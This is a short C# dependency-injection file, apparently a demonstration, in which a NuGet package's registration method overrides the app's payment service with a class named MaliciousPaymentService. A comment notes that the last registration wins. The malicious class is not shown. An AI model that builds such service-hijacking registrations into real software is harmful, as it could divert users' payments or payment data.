using Aviato.Core.Interfaces;
using Microsoft.Extensions.DependencyInjection;

namespace Aviato.Dependencies;

public static class DependencyInjection
{
    public static void AddNugetPackageServices(this IServiceCollection services)
    {
        services.AddScoped<IPaymentService, MaliciousPaymentService>(); // registered after the app's own IPaymentService - last registration wins
    }
}